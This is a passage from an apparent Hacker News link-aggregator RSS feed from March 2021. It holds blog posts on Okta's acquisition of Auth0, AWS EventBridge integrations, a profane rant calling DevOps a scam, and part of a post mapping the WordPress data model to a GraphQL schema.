than the current share price (at the time of writing).<br></p><p><img src="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19.png" loading="lazy" sizes="(max-width: 479px) 320px, (max-width: 767px) 540px, 680px" srcset="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19-p-500.png 500w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19-p-800.png 800w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19-p-1080.png 1080w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19-p-1600.png 1600w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19.png 1830w" alt=""></p><p><strong>Users<br>â€�</strong>In general, the developer community has had an unpleasant
experience with Okta. This is perhaps expected given that it is not a â€œdeveloper firstâ€� company. Below are some
excerpts taken from Hackernews.<br></p>
<p>â€œWe moved from Okta a few years ago after we basically received almost no actual real support
for a bunch of issues, even though we were paying a premium cost. Nobody cares about issues on their Githubâ€�. â€œWe
ended up switching to Auth0â€�, â€œshaved a decent amount off our costsâ€�. â€œIn the end we were much happier.â€�<br></p>
<p>â€œOkta requires you to "contact support" to turn on basic features like email
customization, and even though I'm a paying customer, I was given a multi-week estimate (after waiting a week
or two) for how long it would take to enable this featureâ€�<br></p>
<p>â€œWe use Okta for multiple AWS accounts and they "ran a bad migration" that deleted
half our permissions and took a month to resolve. On top of that, nothing appeared in the audit logs.â€�<br></p>
<p>â€œOkta as a business are a pain to deal with, and unless you meet their minimum spend
requirements (which are not told to you up-front) you're screwed.â€�<br></p>
<p><strong>Employees<br>â€�</strong>Similarly, employees were worried about Auth0, given their
experience with Oktaâ€™s culture and hiring process.<br></p>
<p>â€œI interviewed with both, and the process at Auth0 had me walk away with respect, while
contrasted with Okta that left me reminded that tech hiring is broken.â€�<br></p>
<p>â€œThe two companies couldn't be more different, with Auth0 embracing a remote-first-class
culture with creative interview processes, and Okta (pre-covid) being very much the opposite.â€�<br></p>
<p>I used to work on the Okta team.. As far as I could tell, Okta is a sales company. The
salespeople got the fancy events, the high floors with nice views, all the budgetâ€¦ Enterprise customers are the
only ones that mattered.. I got to know some people who came into Okta via acquisitions and letâ€™s just say itâ€™s
not a fun ride.â€�<br></p>
<h2><strong>What next for Auth0?</strong><br></h2>

<p>â€¨Officially the statement is that the â€œCompany will operate as an independent unit inside of
Okta as they look for paths to integration in the coming monthsâ€�.<br></p>
<h2><strong>What is the opportunity for SuperTokens?â€¨</strong><br></h2>

<ol role="list">
<li>
<p>The incumbents in the space are Okta, Auth0, Firebase and AWS Cognito. However, they are all closed source,
proprietary companies. We have a strong belief in our open source approach as it benefits all stakeholders -
customers, the community and us as a company. There are a few others who are taking this approach and there is
a strong possibility for a project like SuperTokens to reach the scale that matches the incumbents.<br></p>
</li>
<li>
<p>Consolidation typically creates small vacuums. It is our job, as the project creators, to understand which
vacuum (niche) is the strongest.Â&nbsp;<br></p>
</li>
<li>
<div><p>We claim to be truly developer friendly. <b>But what does that really mean?</b> How do we demonstrate
that?
</p><ul>
<li>First is <b>our open source approach</b> - we place developers and the community above all else.</li>Â&nbsp;
<li>Second is the <b>modular architecture of SuperTokens</b>. This enables developers to pick features
they need
for their use
case and forget about the complexity associated with everything else (for example, if you do not need SSO,
no
need worry about OAuth flows). It allows you to add authentication functionality as your product and
company
scale.
<strong>We even have different docs based on your feature set and use case.<br>â€�</strong>
</li>
<li>Finally, our
frontend
UI is the most customizable weâ€™ve seen of any of the alternatives. While Auth0 provides a ready made
frontend
or exposes the backend APIs to build your own frontend, we provide ready made frontends and make it far
easier
to build your own theme or customize existing ones.<br></li>
</ul>
</div>
</li>
</ol>
<p>Hope this added some insight into this massive development. Weâ€™re excited about the space and
are here to serve developers everyday.<br></p>
<p>Written by the Folks at <a href="https://supertokens.io/" aria-current="page">SuperTokens</a> â€” hope you enjoyed! We are always available on our Discord server.
Join us if you have any questions or need any help.<br></p>
<p><a rel="noopener" href="https://supertokens.io/discord" target="_blank"><img src="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Image-93x.png" loading="lazy" width="200" alt=""></a>
</p></div></div>]]>
            </description>
            <link>https://supertokens.io/blog/the-real-reason-okta-spent-on-auth0</link>
            <guid isPermaLink="false">hacker-news-small-sites-26358309</guid>
            <pubDate>Fri, 05 Mar 2021 16:02:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS just took a step towards Hybrid/Multi Cloud]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26358103">thread link</a>) | @socialized
<br/>
March 5, 2021 | https://www.triggermesh.com/blog/the-cloud-native-integration-hits-keep-on-rolling-with-aws-eventbridge-and-triggermesh | <a href="https://web.archive.org/web/*/https://www.triggermesh.com/blog/the-cloud-native-integration-hits-keep-on-rolling-with-aws-eventbridge-and-triggermesh">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When&nbsp; I pontificated&nbsp; in January, on <a href="https://www.triggermesh.com/blog/event-driven-workflows-with-triggermesh-and-amazon-eventbridge">AWS EventBridge</a> and how it related to TriggerMesh,&nbsp; I opined that integration is the frontier in cloud computing that can produce the biggest impact on increasing cloud capabilities and shortening time-to-value. In January, I said this:</p><p>"Combining the power of TriggerMesh and AWS EventBridge, <a href="https://www.triggermesh.com/faq/what-is-aws-lambda">AWS</a> users can easily connect SaaS, cloud, and on-premises applications with Amazon Lambda and cloud-native architectures without writing any additional code. You can modernize your legacy applications to the cloud and leverage your existing IT investment by integrating with Amazon EventBridge and triggering workloads on modern architecture. Accelerate developer productivity and provide consistency when integrating non-AWS services with AWS."</p><p>This week, AWS <a href="https://aws.amazon.com/blogs/compute/using-api-destinations-with-amazon-eventbridge/" target="_blank">announced</a> new capabilities that makes it even easier for cloud developers to provide workflows between cloud and on-premises applications.&nbsp;</p><p>The number of cloud services is exploding and there is a lot of innovation that enterprises can take advantage of but they have legacy systems that they still depend on. That’s why our focus has become the integration of all services and applications in and out of the cloud, and it’s why our decision to provide integrations with AWS as the largest public cloud provider was a “no-brainer.” It’s edifying to see them following our lead and expanding their capabilities to integrate outside of their ecosystem.&nbsp;</p><p>In August of last year, we <a href="https://www.triggermesh.com/blog/triggermesh-enables-on-premises-and-hybrid-cloud-serverless-application-integrations-via-amazon-eventbridge">announced </a>our integration with EventBridge to use sources from a variety of cloud events to trigger AWS workloads. This unique capability means that TriggerMesh can act as a bridge to source events from any cloud service or application into AWS, and use this external data to feed AWS services without writing a single line of code.&nbsp;</p><p>With this week’s announcement, Amazon EventBridge has added the capability to export events from their ecosystem to other applications and services. This validates our point of view and we are excited to be able to extend this capability with an easy way to integrate AWS services with non-AWS services and applications.&nbsp;</p><figure><p><img src="https://global-uploads.webflow.com/5f683649f57c921f6db67087/6041383a7bbb53c87be73bec_Screen%20Shot%202021-03-04%20at%202.42.23%20PM.png" loading="lazy" alt=""></p></figure><p>The ability to use the TriggerMesh declarative API is another powerful reason why TriggerMesh and EvenBridge are two great tastes that taste great together.Cloud operators who want to manage their integrations the same way they use Cloud Formation or Terraform for <strong>infrastructure-as-code </strong>can use the TriggerMesh declarative API to deploy<strong> integrations-as-code</strong>. With this powerful capability, users can create and deploy automated event-driven workflows between AWS and a variety of popular cloud services and even create custom integrations with their existing on-premises applications and microservices. What’s more, you can use our declarative API to deploy integrations using your CI/CD loops, automating not only the deployment of applications and services but also the integrations between them.</p><p>We know that <a href="https://www.triggermesh.com/faq/what-is-cloud-native">cloud-native</a> developers want to build applications that connect a variety of services and data sources. Amazon provides many of the most widely-used cloud services, and for integrations with legacy applications, we believe that TriggerMesh is the best way to provide these enterprise integrations and to do so cloud-natively.&nbsp;</p></div><div><p><a href="https://www.triggermesh.com/team/mark-hinkle"><img loading="lazy" src="https://global-uploads.webflow.com/5f683649f57c921f6db67087/5f76cbef56ac8ba29514a504_mark.jpg" alt="Mark Hinkle"></a></p><div><p><a href="https://www.triggermesh.com/team/mark-hinkle">Mark Hinkle</a></p><p>Mark has a long history in emerging technologies and open source. Before co-founding TriggerMesh, he was the Executive Director of the Node.js Foundation with membership including Microsoft, IBM, Google, Intel, PayPal, and other industry leaders. Previously, he was the VP of Marketing at The Linux Foundation. Mark joined the Linux Foundation from Citrix where he was the Head of the Citrix Open Source Business Office.</p></div></div></div>]]>
            </description>
            <link>https://www.triggermesh.com/blog/the-cloud-native-integration-hits-keep-on-rolling-with-aws-eventbridge-and-triggermesh</link>
            <guid isPermaLink="false">hacker-news-small-sites-26358103</guid>
            <pubDate>Fri, 05 Mar 2021 15:46:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advice you could give to your younger self regarding coding]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26357855">thread link</a>) | @eleftheria
<br/>
March 5, 2021 | https://eleftheriabatsou.hashnode.dev/355-advice-you-could-give-to-your-younger-self-regarding-coding | <a href="https://web.archive.org/web/*/https://eleftheriabatsou.hashnode.dev/355-advice-you-could-give-to-your-younger-self-regarding-coding">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://eleftheriabatsou.hashnode.dev/355-advice-you-could-give-to-your-younger-self-regarding-coding</link>
            <guid isPermaLink="false">hacker-news-small-sites-26357855</guid>
            <pubDate>Fri, 05 Mar 2021 15:28:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Py package to scrape any Google News page without being blocked]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26357543">thread link</a>) | @artembugara
<br/>
March 5, 2021 | https://blog.newscatcherapi.com/scraping-google-news/ | <a href="https://web.archive.org/web/*/https://blog.newscatcherapi.com/scraping-google-news/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://blog.newscatcherapi.com/scraping-google-news/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26357543</guid>
            <pubDate>Fri, 05 Mar 2021 15:02:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Systemd needs (or could use) a linter for unit files]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26357456">thread link</a>) | @zdw
<br/>
March 5, 2021 | https://utcc.utoronto.ca/~cks/space/blog/linux/SystemdUnitLinterNeed | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/linux/SystemdUnitLinterNeed">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/linux/SystemdUnitLinterNeed</link>
            <guid isPermaLink="false">hacker-news-small-sites-26357456</guid>
            <pubDate>Fri, 05 Mar 2021 14:54:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DevOps Is a Poorly Executed Scam (2011)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26357352">thread link</a>) | @Fiveplus
<br/>
March 5, 2021 | http://widgetsandshit.com/teddziuba/2011/03/devops-scam.html | <a href="https://web.archive.org/web/*/http://widgetsandshit.com/teddziuba/2011/03/devops-scam.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="http://widgetsandshit.com/teddziuba/images/and-this-is-a-poorly-executed-troll.png">I've got to hand it to the Agile development guys — they were really good at liberating money out of organizations that all had trouble with something inherently difficult. The geniuses who developed Scrum and Extreme Programming executed masterfully; selling books and training; and they made some serious bank doing it. If you hang around Silicon Valley long enough, you know to applaud the hustle.  It's the classic <em>Rainmaker</em> scam.  You pay a man to make it rain on your crops, and when it rains, he takes the credit. If it doesn't rain, he comes up with an excuse that involves you paying more money.</p>

<p>So, given that, I'm befuddled by the Devops movement. It's got the potential to make a handful of people a lot of money in the same way that Agile did, but nobody is really executing on it. It's proper snake oil with all the trimmings: prescription of "culture change", few and vague concrete steps for implementation, and most of all, the promise to solve an age old problem.</p>

<h3>How do you implement Devops?</h3>

<p>Point one. Nobody seems to know. At least with Scrum, you could buy the book and take the course. From what I have gathered by reading blogs, if you want to apply Devops to organization, you do any or all of these things:

</p><ul>
  <li><em>Automate configuration with Puppet or whatever.</em> You should be doing this anyway. Not earth shattering.</li>
  <li><em>One-step build and deploy.</em> I'm still waiting for you tell me how these steps will solve my problems.</li>
  <li><em>Culture of respect &amp; trust, good attitude toward failure.</em> How about "culture of <em>stop fucking up</em>"? This is one of those obvious happy-horseshit type statements that makes you believe the salesman is benevolent. A developer who consistently ships broken code or a sysadmin who consistently pushes out broken configuration aren't going to get any better with respect or trust.</li>
  <li><em>Have cross-functional team members to facilitate communication</em> Every technical person you hire should be cross functional enough that you don't need this.</li>
</ul><p>

These things are all the basics you pick up by reading <em>Learn How Not to be a Complete Failure at Software Development in 24 Hours</em>. None of it will make your developers any less prone to do stupid shit, and none of it will prevent your systems administrators from roadblocking developers just for funsies.</p>

<p>One of the things I read frequently is that <em>Devops is about building bridges and communication</em>. What the shit does that even mean? Cute, but not useful. Clearly everybody deserves to be treated with respect in the workplace, but you can't make two different groups work together just by telling them to, or even by having cross-functional team members to coordinate. If you've hired people explicitly as peacemakers between development and ops, you fucked up somewhere in your hiring process; it's fixing a self-inflicted problem.</p>

<p>If you are going to pimp this stuff as "the new way of doing things", at least try to sell me a book.</p>

<h3>What is the problem you want to solve?</h3>
<p>The main issue with the Devops movement is that it treats symptoms, not problems. Yes, everybody wants to ship new code frequently and keep it stable, but the dev vs. ops feud is as old as the phrase "it's 98% done, I just have to test it". The symptoms of the problem are these:

</p><ul>
  <li>Developers write code on their workstations and it doesn't work in production.</li>
  <li>Systems administrators are slow and reluctant to change production configurations.</li>
</ul><p>

As a result, it takes longer to ship features than it should.</p>

<p>The underlying problem, however, is that dev and ops have different goals, and each group's problem solving skills is a product of those goals. The Devops movement does try to cultivate some kind of understanding that developers and systems administrators are both working toward the same end, to put food on the table, but you will never be able to effect cultural change just by saying so. <em>Surly's only looking out for one person, and that's Surly.</em></p>

<h3>What condition your condition is in</h3>

<p>You will always have problems between development and operations if the two groups think so differently about technical problems. So, I offer a test. One technical question that will show you how different development and operations really are:

</p><blockquote>
Devise a caching infrastructure for responses from the Google Maps Geocoder API.
</blockquote><p>

The end. Gather dev in one room, and ops in the other, and have them each come up with an answer. If they come up with the same answer, there is hope for your organization. If they don't, put them in one room and have them work it out until there is a unanimous solution, and everyone agrees that it is the best. If they can't agree on a solution, you have problems that no methodology can fix. (For bonus points, make this a universal interview question.)</p>

<p>After that exercise, development and operations should reasonably be on the same page. Next, you need to implement policy that will force convergence between development and operations. This is my prescription:

</p><ul>
  <li><em><strong>Developers are in the on-call rotation</strong></em> If you ship a feature, you help support it. This one is first because it's the most important. If you architect a system, you write the Nagios alerts for it, and they page your phone. Believe me, you will get a crystal clear understanding of why ops throws up so many roadblocks after doing this for a few months.</li>
  <li><em><strong>Developers develop in the same environment production runs in</strong></em> If you deploy to Linux, you develop on Linux. No more of this coding on your Macbook Pro and deploying to Ubuntu: that is why you can't have nice things.</li>
  <li><em><strong>Downtime never happens twice</strong></em> After problems are fixed short-term, you make it first priority to ensure that the same failure does not happen again.</li>
</ul><p>

That's it. When developers are woken up during downtime, they will adjust their attitude toward operations in a hurry. Yes, the site is down because your architecture sucks. No, cosmic rays did not flip bits in RAM. Clearly, you want development and ops to solve problems collaboratively, and it just won't work if the two groups are too different.</p>

<p>Since no methodology peddler ever wants to say this, I will: <em>there's a point where you're simply fucked.</em> Meaning, you can't solve the problem with the tools available. Sometimes, you have to fire people who aren't working out. Sometimes, you're too deep in technical debt and too pressed for time to do it the "right way". And sometimes, projects fail. It is what it is. This isn't defeatist, it's realist.</p>

<p>I am not trying to sell you a book, I am just being honest about the problems you face. None of this amounts to a <em>methodology</em>, as the Devops people would have you believe. If your developers and your sys admins are so culturally different that they can't agree on a solution to a simple technical problem, then your organization will not be fixed by some sunshine-up-your-ass methodology you read about in a blog or hear about at a conference. You need to change the culture the hard way, or replace people as necessary until the culture works.</p>
<p>The Devops movement smells of a scam in the making, not that I have any problem with that, after all, don't knock the hustle. However, I'd rather not see people with real problems get roped in, thinking that there's a magical 12-step program that will solve deep rooted problems. It just doesn't work that way. Even so, the Devops people have a bit of traction, and they're failing to capitalize on it. You've got a good thing going here, <em><strong>profit</strong></em> from that shit. Books, training, conferences, the whole bit. Get down to it.</p>
</div></div>]]>
            </description>
            <link>http://widgetsandshit.com/teddziuba/2011/03/devops-scam.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26357352</guid>
            <pubDate>Fri, 05 Mar 2021 14:45:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Two Classes of Software Engineer]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 61 (<a href="https://news.ycombinator.com/item?id=26356976">thread link</a>) | @wagslane
<br/>
March 5, 2021 | https://qvault.io/2021/03/05/the-two-classes-of-software-engineer/ | <a href="https://web.archive.org/web/*/https://qvault.io/2021/03/05/the-two-classes-of-software-engineer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://qvault.io/2021/03/05/the-two-classes-of-software-engineer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356976</guid>
            <pubDate>Fri, 05 Mar 2021 14:06:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generating ePub from LaTeX]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 13 (<a href="https://news.ycombinator.com/item?id=26356903">thread link</a>) | @ivan_ah
<br/>
March 5, 2021 | https://minireference.com/blog/generating-epub-from-latex/ | <a href="https://web.archive.org/web/*/https://minireference.com/blog/generating-epub-from-latex/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://minireference.com/blog/generating-epub-from-latex/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356903</guid>
            <pubDate>Fri, 05 Mar 2021 13:59:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rejuvenating WordPress Through GraphQL]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26356546">thread link</a>) | @jun-e
<br/>
March 5, 2021 | https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/ | <a href="https://web.archive.org/web/*/https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>WordPress is a legacy CMS: having been invented over 17 years ago, it's filled with PHP code that, given a new chance, it would be coded in a different way.</p><p>GraphQL is a modern interface to access data. Please notice the word "interface": it doesn't care how the underlying data system is implemented, but only how to expose the data.</p><p>What happens when we put these two together? How should we design the GraphQL interface to access data from WordPress?</p><p>There are a couple of obvious strategies that we can put in place:</p><ol><li><p>Respect tradition, and provide a mapping that keeps the WordPress data model as is, including the technical debt it accumulated during the years</p></li><li><p>Fix the technical debt, providing an interface exposing data in an abstract, not-necessarily-fixed-to-WordPress way</p></li></ol><p>Both approaches have benefits and drawbacks, and there is no right or wrong. It's just opinionatedness, prioritizing some behavior over another.</p><p>For plugin <a href="https://graphql-api.com/">GraphQL API for WordPress</a> I have chosen the latter approach, attempting to create a GraphQL schema that, even though it is based on WordPress and works for WordPress, it is not tied to WordPress (for instance, by removing inconsistent names and relationships).</p><p>The result is that GraphQL rejuvenates WordPress: while we still have WordPress as our underlying CMS, with its legacy PHP code, its data layer can be created anew, based on common sense, not tradition. The data layer goes back from being an adolescent, to become a toddler again.</p><p><img src="https://graphql-api.com/images/own-good-together-best.jpg" alt="GraphQL + WordPress rock" loading="lazy" width="577" height="433"></p><p>The result is <a href="https://newapi.getpop.org/graphql-interactive/">this GraphQL schema, representing the WordPress data model</a>, and also <a href="https://newapi.getpop.org/graphql-interactive/?mutation_scheme=nested">supporting nested mutations</a>.</p><p>Let's check out it was carried out.</p><h2 id="heading-the-wordpress-data-model">The WordPress data model<a href="#heading-the-wordpress-data-model"><span> permalink</span></a></h2><p>WordPress has the following entities:</p><ul><li>posts</li><li>pages</li><li>custom posts</li><li>media elements</li><li>users</li><li>user roles</li><li>tags</li><li>categories</li><li>comments</li><li>blocks</li><li>meta properties</li><li>others (options, plugins, themes, etc)</li></ul><p>These entities can have a hierarchy. For instance, post, page and media elements are both custom post types, and tags and categories are both taxonomies.</p><p>This is the WordPress database diagram, showing how data for all entities is stored:</p><figure><a href="https://graphql-api.com/assets/guides/query/wp-data-model.png" target="_blank"><img src="https://graphql-api.com/assets/guides/query/wp-data-model.png" alt="The WordPress database diagram" loading="lazy" width="793" height="1118"></a><figcaption>The WordPress database diagram</figcaption></figure><h2 id="heading-is-the-mapping-an-exact-replica-of-the-db-diagram">Is the mapping an exact replica of the DB diagram?<a href="#heading-is-the-mapping-an-exact-replica-of-the-db-diagram"><span> permalink</span></a></h2><p>When mapping the WordPress database into a GraphQL schema, is the same diagrame above respected 1 to 1?</p><p>No, it is not. While the database diagram is an actual implementation, GraphQL is an interface to access the data from the client. These two are related, but they can be different. GraphQL doesn't care about the database: it doesn't think in SQL commands, or know there are database tables called <code>wp_posts</code> and <code>wp_users</code>.</p><p>So we don't need to worry too much about the database diagram when creating the GraphQL schema for WordPress. That means that we can produce a GraphQL schema that fixes some of the technical debt from the WordPress data model.</p><h2 id="heading-mapping-the-wordpress-data-model-as-a-graphql-schema">Mapping the WordPress data model as a GraphQL schema<a href="#heading-mapping-the-wordpress-data-model-as-a-graphql-schema"><span> permalink</span></a></h2><p>Let's do the mapping. First, we map the original entities as types, as much as possible. From the list of entities in the WordPress data model, we produce the following types for the GraphQL schema:</p><ul><li><code>Post</code></li><li><code>Page</code></li><li><code>Media</code></li><li><code>User</code></li><li><code>UserRole</code></li><li><code>PostTag</code></li><li><code>PostCategory</code></li><li><code>Comment</code></li></ul><p>Then, we add all the expected fields to every type. To represent the schema, we can use the SDL, or Schema Definition Language. (This is used for documentation purposes only; the plugin itself does not use SDL to codify the schema: it's all PHP code).</p><p>These are the fields (among many others) for a <code>Post</code>:</p><pre><code><span><span>type</span> <span>Post</span> <span>{</span></span><br><span>  <span>id</span><span>:</span> ID<span>!</span></span><br><span>  <span>title</span><span>:</span> String</span><br><span>  <span>content</span><span>:</span> String</span><br><span>  <span>excerpt</span><span>:</span> String</span><br><span>  <span>date</span><span>:</span> Date<span>!</span></span><br><span><span>}</span></span></code></pre><p>These are the fields (among many others) for a <code>User</code>:</p><pre><code><span><span>type</span> <span>User</span> <span>{</span></span><br><span>  <span>id</span><span>:</span> ID<span>!</span></span><br><span>  <span>name</span><span>:</span> String</span><br><span>  <span>email</span><span>:</span> String<span>!</span></span><br><span><span>}</span></span></code></pre><p>We also create the corresponding connections, which are fields that return another entity (instead of a scalar, such as a number or a string). For instance, we represent a post having an author, and a user owning posts:</p><pre><code><span><span>type</span> <span>Post</span> <span>{</span></span><br><span>  <span>author</span><span>:</span> User<span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>User</span> <span>{</span></span><br><span>  <span>posts</span><span>:</span> <span>[</span>Post<span>]</span></span><br><span><span>}</span></span></code></pre><p>Fields and connections can also accept arguments. For instance, we enable <code>Post.date</code> to be formatted, and <code>User.posts</code> to search entries and limit their number:</p><pre><code><span><span>type</span> <span>Post</span> <span>{</span></span><br><span>  <span>date</span><span>(</span><span>format</span><span>:</span> String<span>)</span><span>:</span> Date<span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>User</span> <span>{</span></span><br><span>  <span>posts</span><span>(</span><span>limit</span><span>:</span> Int<span>,</span> <span>search</span><span>:</span> String<span>)</span><span>:</span> <span>[</span>Post<span>]</span></span><br><span><span>}</span></span></code></pre><p>We keep doing this for all entities in the WordPress data model. Once we are done, we'll arrive at the GraphQL schema for WordPress, as visible using the Voyager client (available as "Interactive Schema" on the plugin's menu):</p><figure><a href="https://graphql-api.com/assets/guides/interactive-schema.png" target="_blank"><img src="https://graphql-api.com/assets/guides/interactive-schema.png" alt="The GraphQL schema for WordPress" loading="lazy" width="1680" height="976"></a><figcaption>The GraphQL schema for WordPress</figcaption></figure><p>This schema has similarities to the WordPress database diagram, but also many differences. Let's analyse them.</p><h3 id="heading-operations-without-entity-are-mapped-as-root-fields">Operations without entity are mapped as Root fields<a href="#heading-operations-without-entity-are-mapped-as-root-fields"><span> permalink</span></a></h3><p>In the WordPress database diagram represents how data is stored, so there is no "beginning". GraphQL, though, is an interface to retrieve data, hence there must be an initial stage from which to execute the query.</p><p>This initial stage is the <code>Root</code> type, or, to be more precise, the <code>QueryRoot</code> and <code>MutationRoot</code> types (to deal with queries and mutations, respectively).</p><p>In these two types, we map all operations that do not depend on an entity, such as when executing <code>get_posts()</code>, <code>get_users()</code> or <code>wp_signon()</code>:</p><pre><code><span><span>type</span> <span>QueryRoot</span> <span>{</span></span><br><span>  <span>posts</span><span>:</span> <span>[</span>Post<span>]</span><span>!</span></span><br><span>  <span>users</span><span>:</span> <span>[</span>User<span>]</span><span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>MutationRoot</span> <span>{</span></span><br><span>  <span>logUserIn</span><span>(</span><span>username</span><span>:</span> String<span>,</span> <span>password</span><span>:</span> String<span>)</span><span>:</span> User</span><br><span><span>}</span></span></code></pre><p>The fields do not need to have the same name or signature as the operation they represent. For instance, calling field <code>logUserIn</code> can be considered more suitable than <code>signOn</code>.</p><h3 id="heading-all-mutations-go-under-mutationroot">All mutations go under MutationRoot<a href="#heading-all-mutations-go-under-mutationroot"><span> permalink</span></a></h3><p>There are operations which do depend on an entity, such as <code>wp_update_post()</code>, which is applied on some post. The corresponding mutation on the GraphQL schema must be added to the <code>MutationRoot</code> type, because that's how GraphQL works.</p><p>Then, this operation is mapped like this:</p><pre><code><span><span>type</span> <span>MutationRoot</span> <span>{</span></span><br><span>  <span>updatePost</span><span>(</span><span>postID</span><span>:</span> ID<span>!</span><span>,</span> <span>newTitle</span><span>:</span> String<span>,</span> <span>newContent</span><span>:</span> String<span>)</span><span>:</span> Post</span><br><span><span>}</span></span></code></pre><p>This plugin also supports nested mutations, which are offered as an opt-in feature (because this is not standad GraphQL behavior). Then, mutations can also be added under any type, not just <code>MutationRoot</code>. In this case, we obtain:</p><pre><code><span><span>type</span> <span>Post</span> <span>{</span></span><br><span>  <span>update</span><span>(</span><span>newTitle</span><span>:</span> String<span>,</span> <span>newContent</span><span>:</span> String<span>)</span><span>:</span> Post<span>!</span></span><br><span><span>}</span></span></code></pre><h3 id="heading-dealing-with-custom-posts">Dealing with custom posts<a href="#heading-dealing-with-custom-posts"><span> permalink</span></a></h3><p>There is no type inheritance in GraphQL. Hence, we can't have a type <code>CustomPost</code>, and declare that <code>Post</code> and <code>Page</code> extend it.</p><p>GraphQL offers two resources to compensate for this lack: interfaces and union types.</p><p>For the first one, we create an interface <code>IsCustomPost</code> for the schema, declaring all the fields expected from a custom post, and we define types <code>Post</code> and <code>Page</code> to implement the interface:</p><pre><code><span><span>interface</span> <span>IsCustomPost</span> <span>{</span></span><br><span>  <span>title</span><span>:</span> String</span><br><span>  <span>content</span><span>:</span> String</span><br><span>  <span>excerpt</span><span>:</span> String</span><br><span>  <span>date</span><span>(</span><span>format</span><span>:</span> String<span>)</span><span>:</span> Date<span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>Post</span> <span>implements</span> <span>IsCustomPost</span> <span>{</span></span><br><span>  <span>title</span><span>:</span> String</span><br><span>  <span>content</span><span>:</span> String</span><br><span>  <span>excerpt</span><span>:</span> String</span><br><span>  <span>date</span><span>(</span><span>format</span><span>:</span> String<span>)</span><span>:</span> Date<span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>Page</span> <span>implements</span> <span>IsCustomPost</span> <span>{</span></span><br><span>  <span>title</span><span>:</span> String</span><br><span>  <span>content</span><span>:</span> String</span><br><span>  <span>excerpt</span><span>:</span> String</span><br><span>  <span>date</span><span>(</span><span>format</span><span>:</span> String<span>)</span><span>:</span> Date<span>!</span></span><br><span><span>}</span></span></code></pre><p>For the second one, we create a <code>CustomPostUnion</code> type for the schema returning all the custom post types:</p><pre><code><span><span>union</span> <span>CustomPostUnion</span> <span>=</span> Post <span>|</span> Page</span></code></pre><p>And have fields return this type whenever appropriate:</p><pre><code><span><span>type</span> <span>QueryRoot</span> <span>{</span></span><br><span>  <span>customPost</span><span>(</span><span>id</span><span>:</span> ID<span>)</span><span>:</span> CustomPostUnion</span><br><span>  <span>customPosts</span><span>:</span> <span>[</span>CustomPostUnion<span>]</span><span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>User</span> <span>{</span></span><br><span>  <span>customPosts</span><span>:</span> <span>[</span>CustomPostUnion<span>]</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>Comment</span> <span>{</span></span><br><span>  <span>customPost</span><span>:</span> CustomPostUnion<span>!</span></span><br><span><span>}</span></span></code></pre><p>As it can be observed, in the GraphQL schema we need to explicitly assert when we are dealing with posts, and when with custom posts, since they are not the same! Calling these two interchangeably is technical debt from WordPress, which we can fix.</p><p>For this reason, a custom post is always called <code>CustomPost</code> and not <code>Post</code>, a field dealing with custom posts is always called <code>customPosts</code> and not <code>posts</code>, and a field argument receiving the ID for a custom post is called <code>customPostID</code> and not <code>postID</code> (even though that's how it's called in the 